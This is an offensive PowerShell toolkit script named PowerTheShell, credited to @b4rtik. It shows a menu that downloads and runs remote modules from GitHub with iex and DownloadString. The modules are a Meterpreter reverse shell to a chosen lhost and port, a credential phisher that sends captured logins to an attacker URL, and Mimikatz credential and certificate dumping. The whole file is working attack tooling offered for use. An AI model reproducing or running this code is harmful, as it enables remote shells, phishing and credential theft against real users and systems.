function PowerTools 
{
<#
.SYNOPSIS
	Main script.  
.DESCRIPTION
	Author: @b4rtik
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.EXAMPLE
	C:\PS> PowerTools
#>
    Write-Host "----------------------------------------------------------------------------------"
    Write-Host " _____                    _______ _           _____ _          _ _                "
    Write-Host "|  __ \                  |__   __| |         / ____| |        | | |               "
    Write-Host "| |__) |____      _____ _ __| |  | |__   ___| (___ | |__   ___| | |               "
    Write-Host "|  ___/ _ \ \ /\ / / _ \ '__| |  | '_ \ / _ \\___ \| '_ \ / _ \ | |               "
    Write-Host "| |  | (_) \ V  V /  __/ |  | |  | | | |  __/____) | | | |  __/ | |               "
    Write-Host "|_|   \___/ \_/\_/ \___|_|  |_|  |_| |_|\___|_____/|_| |_|\___|_|_|               " 
    Write-Host "----------------------------------------------------------------------------------"
    Write-Host ""
    Write-Host "1: Get-AVStatus"
    Write-Host "2: Invoke-Shellcode"
    Write-Host "3: Invoke-CredentialPhisher"
    Write-Host "4: Invoke-Mimikatz"
    Write-Host "99: Exit"
    Write-Host ""

    $shellcodeL = $false
    $credentiaL = $false
    $mimikatz = $false

    while($True)
    {
        $menu1cmd = Read-Host -Prompt 'run option' 
        switch($menu1cmd)
        {
		1 {
                            Handle-AVStatus
                  }
		2 { 
                            if($shellcodeL -eq $false)
			    {
                                iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-MetShell.ps1'))
                                $shellcodeL = $True
                            }
                            Handle-Shellcode
                  }
		3 {
                            
                            if($credentiaL -eq $false)
			    {
                                iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-CredPhisher.ps1'))
                                $credentiaL = $True
                            }
                            Handle-CredentialPhisher 
                  }
                4 {
                            if($mimikatz -eq $false)
			    {
				    iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-Mimikatz.ps1'))
				    $mimikatz = $True
                            }
			    Handle-Mimikatz
                  }
                99{
                            return 
                  }
        }
    } 
}


function Handle-AVStatus 
{ 
   Get-AVStatus 
}

function Handle-Shellcode {
   Write-host "" 
   $lhost = Read-Host -Prompt '(Invoke-Shellcode) lhost'
   $lport = Read-Host -Prompt '(Invoke-Shellcode) lport'
   Invoke-MetShell -lhost $lhost -lport $lport 
}

function Handle-CredentialPhisher {
   Write-host "" 
   $type = Read-Host -Prompt '(Invoke-CredentialPhisher) type'
   $attackerurl = Read-Host -Prompt '(Invoke-CredentialPhisher) attackerurl'
   Invoke-CredPhisher -type $type -attackerurl $attackerurl
}

function Handle-Mimikatz {
   Write-host ""
   Write-Host "1: DumpCreds"
   Write-Host "2: DumpCerts"
   Write-Host "3: Command"
   Write-host ""
   
   $menuMcmd = Read-Host -Prompt '(Invoke-Mimikatz) run option' 
   switch($menuMcmd)
   {
        1 {
                            Invoke-Mimikatz -DumpCreds
          }
		2 { 
                            Invoke-Mimikatz -DumpCerts
          }
		3 {
                            $command = Read-Host -Prompt '(Invoke-Mimikatz) command'
                           if($command -ne "")
                           {
                                $command = $command.replace("|","")
                                $command = $command.replace("""","")
                                Invoke-Mimikatz -Command "$command"
                           } 
          }
  default {
                            Invoke-Mimikatz -DumpCreds
          }
   }   
}

PowerTools
